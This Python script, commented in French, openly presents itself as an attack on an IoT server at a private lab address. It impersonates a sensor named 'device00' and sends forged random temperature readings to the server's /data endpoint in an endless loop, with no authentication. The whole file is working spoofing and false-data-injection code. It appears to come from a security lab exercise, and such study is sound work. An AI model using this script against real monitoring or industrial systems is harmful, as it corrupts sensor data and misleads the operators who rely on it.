import requests
import json
import time
from scapy.all import IP, TCP, send
import random


server_ip = "192.168.1.30" #Addr IP du serveur a attaque


device_id = "device00"  # Nom du capteur a attaquer


temperature = random.randint(15, 20)# Temperature (mettre une valeur aléatoire)


server_port = 80 
server_url = "http://"+server_ip+":"+str(server_port) +"/data"



# Données JSON à envoyer
data = {
    "id": device_id,
    "temperature": temperature
}

# En-têtes de la requête (optionnel, mais recommandé pour spécifier le type de contenu)
headers = {
    "Content-Type": "application/json"
}

print("Depart envoi")
while True:
    
    print("----->Envoi temperature aleatoire")
    response = requests.post(server_url, data=json.dumps(data), headers=headers)

    # Affichage de la réponse du serveur
    if response.status_code == 200:
        print("Réponse du serveur :", response.text)
    else:
        print(f"Erreur d'envoi : {response.status_code}, {response.text}")

    time.sleep(2)
    data["temperature"] = random.randint(15, 20)
